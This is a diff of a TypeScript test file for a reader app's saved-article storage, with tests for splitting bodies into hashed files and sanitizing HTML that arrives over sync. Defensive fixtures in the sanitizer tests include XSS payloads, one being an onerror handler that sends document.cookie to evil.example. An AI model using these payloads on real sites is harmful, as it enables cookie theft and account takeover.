@@ -8,8 +8,13 @@
 
 import { expect, test } from "bun:test";
 import {
+  articleBodyBytes,
+  articleBodyHash,
+  buildArticleBody,
   buildSavedArticle,
   formatPublishedAt,
+  hasInlinedBody,
+  parseArticleBody,
   normalizeArticleUrl,
   parseSavedArticles,
   removeSavedArticleById,
@@ -35,6 +40,14 @@ function input(over: Partial<SavedArticleInput> = {}): SavedArticleInput {
     html: "<p>body</p>",
     ...over,
   };
+}
+
+// buildSavedArticle takes the body pointer rather than deriving it — hashing is
+// async and it stays pure — so everything below that does not care about the
+// body hands it an empty one. Where the body itself is what is under test,
+// buildArticleBody and articleBodyHash are called directly.
+function saved(from: SavedArticleInput, savedAt: number): SavedArticle {
+  return buildSavedArticle(from, savedAt, { hash: "", chars: from.text.trim().length });
 }
 
 // --- normalizeArticleUrl ----------------------------------------------------
@@ -99,33 +112,54 @@ test("savedArticleId is empty with neither a link nor a title, so nothing is sav
 
 // --- buildSavedArticle ------------------------------------------------------
 
-test("buildSavedArticle derives the id, pins savedAt and strips inlined images", () => {
-  const a = buildSavedArticle(
-    input({
-      url: "https://example.com/a/?utm_source=feed",
-      html: '<p>keep</p><img src="data:image/jpeg;base64,AAAA">',
-      text: "  body text  ",
-    }),
-    1_700_000_000_000,
-  );
+test("buildSavedArticle derives the id, pins savedAt and points at the body", () => {
+  const a = buildSavedArticle(input({ url: "https://example.com/a/?utm_source=feed" }), 1_700_000_000_000, {
+    hash: "0123456789abcdef0123456789abcdef",
+    chars: 9,
+  });
   expect(a.id).toBe("https://example.com/a");
   expect(a.savedAt).toBe(1_700_000_000_000);
-  expect(a.html).toBe("<p>keep</p>");
-  expect(a.text).toBe("body text");
+  expect(a.bodyHash).toBe("0123456789abcdef0123456789abcdef");
+  expect(a.textChars).toBe(9);
+  // The record is the index now: the body is not in it, and neither is the room
+  // it used to take (883 KB of file, of which 857 KB was body).
+  expect(hasInlinedBody(a)).toBe(false);
+});
+
+// The record grew to 41 KB apiece by carrying the body; a base64 image inside it
+// would have been worse again.
+test("buildArticleBody trims the text and strips an inlined image", () => {
+  const body = buildArticleBody({
+    html: '<p>keep</p><img src="data:image/jpeg;base64,AAAA">',
+    text: "  body text  ",
+  });
+  expect(body.html).toBe("<p>keep</p>");
+  expect(body.text).toBe("body text");
+});
+
+// The file name is the hash of the file's own bytes, which is what makes a body
+// immutable and what makes two devices splitting the same record converge on one
+// file rather than two.
+test("a body's bytes and hash depend on the body and on nothing else", async () => {
+  const a = buildArticleBody({ text: "body", html: "<p>body</p>" });
+  const b = buildArticleBody({ text: "  body  ", html: "<p>body</p>" });
+  expect(articleBodyBytes(a)).toBe(articleBodyBytes(b));
+  expect(await articleBodyHash(a)).toBe(await articleBodyHash(b));
+  expect(await articleBodyHash(a)).toMatch(/^[0-9a-f]{32}$/);
+  expect(await articleBodyHash(a)).not.toBe(
+    await articleBodyHash(buildArticleBody({ text: "other", html: "<p>body</p>" })),
+  );
 });
 
 // Both are what docs/21 needs at quote time: without publishedAt a
 // three-month-old piece reads as news, without summaryOnly a summary reads as
 // the article.
 test("buildSavedArticle carries publishedAt and summaryOnly through", () => {
-  const dated = buildSavedArticle(
-    input({ publishedAt: "2026-07-20T08:00:00Z", summaryOnly: true }),
-    1,
-  );
+  const dated = saved(input({ publishedAt: "2026-07-20T08:00:00Z", summaryOnly: true }), 1);
   expect(dated.publishedAt).toBe("2026-07-20T08:00:00Z");
   expect(dated.summaryOnly).toBe(true);
 
-  const full = buildSavedArticle(input({ publishedAt: "", summaryOnly: false }), 1);
+  const full = saved(input({ publishedAt: "", summaryOnly: false }), 1);
   expect(full.publishedAt).toBe("");
   expect(full.summaryOnly).toBe(false);
 });
@@ -133,8 +167,8 @@ test("buildSavedArticle carries publishedAt and summaryOnly through", () => {
 // --- upsertSavedArticle -----------------------------------------------------
 
 test("upsertSavedArticle appends an article the list does not have", () => {
-  const first = buildSavedArticle(input({ url: "https://example.com/a" }), 10);
-  const second = buildSavedArticle(input({ url: "https://example.com/b" }), 20);
+  const first = saved(input({ url: "https://example.com/a" }), 10);
+  const second = saved(input({ url: "https://example.com/b" }), 20);
   const list = upsertSavedArticle(upsertSavedArticle([], first), second);
   expect(list.map((a) => a.id)).toEqual(["https://example.com/a", "https://example.com/b"]);
 });
@@ -144,25 +178,28 @@ test("upsertSavedArticle appends an article the list does not have", () => {
 // reshuffle), and the newer body (a second save may have caught a full text the
 // first one missed).
 test("upsertSavedArticle re-saves in place: one record, first savedAt, newer body", () => {
-  const first = buildSavedArticle(input({ html: "<p>summary</p>", text: "summary" }), 10);
-  const again = buildSavedArticle(input({ html: "<p>full text</p>", text: "full text" }), 999);
+  const first = saved(input({ html: "<p>summary</p>", text: "summary" }), 10);
+  const again = buildSavedArticle(input({ html: "<p>full text</p>", text: "full text" }), 999, {
+    hash: "0123456789abcdef0123456789abcdef",
+    chars: 9,
+  });
   const list = upsertSavedArticle(upsertSavedArticle([], first), again);
   expect(list.length).toBe(1);
   expect(list[0].savedAt).toBe(10);
-  expect(list[0].html).toBe("<p>full text</p>");
-  expect(list[0].text).toBe("full text");
+  expect(list[0].bodyHash).toBe("0123456789abcdef0123456789abcdef");
+  expect(list[0].textChars).toBe(9);
 });
 
 test("removeSavedArticleById removes only the named record", () => {
-  const a = buildSavedArticle(input({ url: "https://example.com/a" }), 10);
-  const b = buildSavedArticle(input({ url: "https://example.com/b" }), 20);
+  const a = saved(input({ url: "https://example.com/a" }), 10);
+  const b = saved(input({ url: "https://example.com/b" }), 20);
   expect(removeSavedArticleById([a, b], a.id).map((x) => x.id)).toEqual(["https://example.com/b"]);
 });
 
 test("savedArticlesForTopic filters by topic, newest save first", () => {
-  const mine = buildSavedArticle(input({ url: "https://example.com/1", topicId: "brief" }), 10);
-  const newer = buildSavedArticle(input({ url: "https://example.com/2", topicId: "brief" }), 30);
-  const other = buildSavedArticle(input({ url: "https://example.com/3", topicId: "jits" }), 20);
+  const mine = saved(input({ url: "https://example.com/1", topicId: "brief" }), 10);
+  const newer = saved(input({ url: "https://example.com/2", topicId: "brief" }), 30);
+  const other = saved(input({ url: "https://example.com/3", topicId: "jits" }), 20);
   expect(savedArticlesForTopic([mine, newer, other], "brief").map((a) => a.id)).toEqual([
     "https://example.com/2",
     "https://example.com/1",
@@ -179,7 +216,7 @@ function parseFile(text: string): SavedArticle[] {
 }
 
 test("parseSavedArticles keeps every record it can identify", () => {
-  const good = buildSavedArticle(input(), 1);
+  const good = saved(input(), 1);
   const parsed = parseSavedArticles([
     good,
     // No id, but a url: it gets the id saveArticle would have given it rather
@@ -198,7 +235,7 @@ test("parseSavedArticles keeps every record it can identify", () => {
 });
 
 test("parseSavedArticles reports the entries it cannot carry", () => {
-  const good = buildSavedArticle(input(), 1);
+  const good = saved(input(), 1);
   // An entry with no identity at all and a duplicate of one already taken: the
   // sync merge turns down a whole file holding either (readCollection), so they
   // cannot be written back — they stay in the quarantined copy.
@@ -213,41 +250,28 @@ test("parseSavedArticles turns down a file that is not an array of records", () 
   expect(parseSavedArticles([])).toEqual({ articles: [], repaired: false });
 });
 
-// saved-articles.json sits in the synced folder and merges record by record, so
-// a record can reach this device without ever having gone through saveArticle:
-// a shared folder, a second device, the Drive account. SavedArticleView hands
-// `html` to dangerouslySetInnerHTML, so the read is the trust boundary — the
-// write-side sanitizing guards nothing against someone who writes the file.
-// This walks the whole read path, ending on the exact string the view computes.
-function hostileFile(html: string): string {
-  return JSON.stringify([
-    {
-      id: "https://example.com/a",
-      topicId: "brief",
-      url: "https://example.com/a",
-      title: "A title",
-      source: "src",
-      sourceName: "Source",
-      publishedAt: "",
-      savedAt: 1,
-      summaryOnly: false,
-      text: "",
-      html,
-    },
-  ]);
+// A body file sits in the synced folder beside the records, so it can reach this
+// device without ever having gone through saveArticle: a shared folder, a second
+// device, the Drive account. SavedArticleView hands `html` to
+// dangerouslySetInnerHTML, so the read is the trust boundary — the write-side
+// sanitizing guards nothing against someone who writes the file. This walks the
+// whole read path, ending on the exact string the view computes.
+//
+// The same sanitizer runs over a body still inlined in a record (a device on the
+// older build wrote it); that path has one test of its own further down.
+function storedHtml(html: string): string {
+  return parseArticleBody({ text: "", html }).html;
 }
 
-test("parseSavedArticles neutralizes a body that arrived over sync, not through saveArticle", () => {
-  const [article] = parseFile(
-    hostileFile(
-      `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">` +
-        `<script>alert(1)</script>` +
-        `<a href="javascript:alert(2)">go</a>` +
-        `<p onmouseover=alert(3)>text</p>`,
-    ),
+test("a body file that arrived over sync, not through saveArticle, is neutralized", () => {
+  const html = storedHtml(
+    `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">` +
+      `<script>alert(1)</script>` +
+      `<a href="javascript:alert(2)">go</a>` +
+      `<p onmouseover=alert(3)>text</p>`,
   );
   // What SavedArticleView passes to dangerouslySetInnerHTML.
-  const rendered = articleHtmlForWebview(article.html, article.url);
+  const rendered = articleHtmlForWebview(html, "https://example.com/a");
   expect(rendered).not.toContain("onerror");
   expect(rendered).not.toContain("onmouseover");
   expect(rendered).not.toContain("<script");
@@ -258,19 +282,17 @@ test("parseSavedArticles neutralizes a body that arrived over sync, not through 
 // data:image/svg+xml is markup, and the sanitizer keeps an inline data: image
 // when the tag holds no other usable URL — so the read strips data images too,
 // the same rule the write side applies for size.
-test("parseSavedArticles drops an inlined data: image reaching it from the file", () => {
-  const [article] = parseFile(
-    hostileFile(`<p>a</p><img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="><p>b</p>`),
+test("the read drops an inlined data: image reaching it from the file", () => {
+  expect(storedHtml(`<p>a</p><img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="><p>b</p>`)).toBe(
+    "<p>a</p><p>b</p>",
   );
-  expect(article.html).toBe("<p>a</p><p>b</p>");
 });
 
 // The read guard must not chew up an honest record: an article kept yesterday
 // renders the same today.
-test("parseSavedArticles leaves an ordinary saved body alone", () => {
+test("the read leaves an ordinary saved body alone", () => {
   const html = `<p>Real prose with <b>bold</b>.</p><img src="https://cdn.example/a.jpg" loading="lazy">`;
-  const [article] = parseFile(hostileFile(html));
-  expect(article.html).toBe(html);
+  expect(storedHtml(html)).toBe(html);
 });
 
 // The read guard runs on every read, so a record that sanitizes to something
@@ -283,9 +305,9 @@ test("a stored body renders the same on its tenth read as on its first", () => {
     `<img src="https://cdn.example/a.jpg?w=640&amp;h=480">` +
     `<img src="https://&amp;#101;vil.example/b.jpg">` +
     `<a href="https://x.example/?q=1&amp;r=2">link</a>`;
-  const first = parseFile(hostileFile(stored))[0].html;
+  const first = storedHtml(stored);
   let body = first;
-  for (let i = 0; i < 9; i += 1) body = parseFile(hostileFile(body))[0].html;
+  for (let i = 0; i < 9; i += 1) body = storedHtml(body);
   expect(body).toBe(first);
   expect(first).toContain('src="https://&amp;#101;vil.example/b.jpg"');
 
@@ -304,18 +326,18 @@ test("a stored body renders the same on its tenth read as on its first", () => {
 // the second read and not the first.
 test("dropping an inlined image does not leave the body to settle on a later read", () => {
   const stored = `<pre><img src="data:image/png;base64,AAAA">\n  git log\n</pre>`;
-  const first = parseFile(hostileFile(stored))[0].html;
+  const first = storedHtml(stored);
   let body = first;
-  for (let i = 0; i < 9; i += 1) body = parseFile(hostileFile(body))[0].html;
+  for (let i = 0; i < 9; i += 1) body = storedHtml(body);
   expect(body).toBe(first);
   // The newline was the one the tree builder eats after a <pre> start tag; with
   // the image gone it is the first thing in the block, so it goes.
   expect(first).toBe(`<pre>  git log\n</pre>`);
   // A blank line the reader can see is kept, on the first read and the tenth.
   const blank = `<pre><img src="data:image/png;base64,AAAA">\n\n  git log\n</pre>`;
-  const kept = parseFile(hostileFile(blank))[0].html;
+  const kept = storedHtml(blank);
   expect(kept).toBe(`<pre>\n\n  git log\n</pre>`);
-  expect(parseFile(hostileFile(kept))[0].html).toBe(kept);
+  expect(storedHtml(kept)).toBe(kept);
 });
 
 // Collects what rewriteImageSrcs hands the proxy mapper, which outside Tauri is
@@ -327,9 +349,27 @@ function rewriteProbe(html: string, into: string[]): void {
   });
 }
 
-test("parseSavedArticles survives a record whose html is not a string", () => {
-  const text = JSON.stringify([{ id: "x", html: 42 }, { id: "y" }]);
-  expect(parseFile(text).map((a) => a.html)).toEqual(["", ""]);
+test("parseArticleBody survives a body file that is not the shape it writes", () => {
+  expect(parseArticleBody({ text: 42, html: 42 })).toEqual({ text: "", html: "" });
+  expect(parseArticleBody(null)).toEqual({ text: "", html: "" });
+  expect(parseArticleBody(["a"])).toEqual({ text: "", html: "" });
+});
+
+// A record from a device still on the older build carries its body inline, and
+// that body reaches dangerouslySetInnerHTML the same way. So the record read
+// sanitizes it too — but only when it is really there: a record whose body has
+// been split out must come back with no html key at all, or the split would find
+// something to do on every pass.
+test("a body still inlined in a record is sanitized, and an absent one is not invented", () => {
+  const parsed = parseFile(
+    JSON.stringify([
+      { id: "x", html: `<p onclick=alert(1)>old</p>` },
+      { id: "y", html: 42 },
+      { id: "z", bodyHash: "0123456789abcdef0123456789abcdef", textChars: 4 },
+    ]),
+  );
+  expect(parsed.map((a) => a.html)).toEqual(["<p>old</p>", "", undefined]);
+  expect(parsed.map(hasInlinedBody)).toEqual([true, true, false]);
 });
 
 test("formatPublishedAt shows an unparseable date verbatim and nothing for none", () => {
